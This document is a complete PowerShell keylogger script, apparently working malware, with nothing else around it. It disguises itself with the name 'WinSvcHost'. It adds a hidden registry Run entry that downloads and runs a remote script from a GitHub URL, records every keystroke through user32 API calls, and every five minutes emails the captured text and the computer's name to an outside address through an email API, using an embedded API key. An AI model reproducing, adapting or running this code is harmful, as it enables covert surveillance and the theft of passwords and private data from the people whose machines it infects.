$u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
$k='re_SC8bwXbU_3cyFBwPJsSnqbhUGK428oj44'
$t='elgono_9@hotmail.com'
$m=5
$n='WinSvcHost'

$mx=New-Object System.Threading.Mutex($false,"Local\$n")
if(-not $mx.WaitOne(0)){exit}

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $n -Value "powershell -W Hidden -c iex(irm '$u')" -Force

Add-Type -MemberDefinition @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
'@ -Name Wk7 -Namespace Qz

$sb=New-Object System.Text.StringBuilder 64
$ks=New-Object byte[] 256
$dn=@{}
$sp=@{8='[BKSP]';9='[TAB]';13="`n";27='[ESC]';46='[DEL]';37='[<]';38='[^]';39='[>]';40='[v]'}

$t0=Get-Date
$buf=''

while($true){
  for($i=8;$i -lt 255;$i++){
    if([Qz.Wk7]::GetAsyncKeyState($i) -band 0x8000){
      if(-not $dn[$i]){
        $dn[$i]=$true
        if($sp.ContainsKey($i)){ $ch=$sp[$i] }
        else{
          [void][Qz.Wk7]::GetKeyboardState($ks)
          $r=[Qz.Wk7]::ToUnicode([uint32]$i,0,$ks,$sb,64,0)
          $ch=if($r -ge 1){$sb.ToString()}else{''}
        }
        if($ch){$buf+=$ch}
      }
    } else { $dn[$i]=$false }
  }
  if(((Get-Date)-$t0).TotalMinutes -ge $m -and $buf.Length -gt 0){
    $j='{"from":"onboarding@resend.dev","to":"'+$t+'","subject":"'+$env:COMPUTERNAME+'","text":'+(ConvertTo-Json $buf)+'}'
    try{ iwr 'https://api.resend.com/emails' -Method Post -Headers @{Authorization="Bearer $k"} -ContentType 'application/json' -Body $j -UseBasicParsing -TimeoutSec 20 | Out-Null }catch{}
    $buf=''; $t0=Get-Date
  }
  Start-Sleep -Milliseconds 12
}
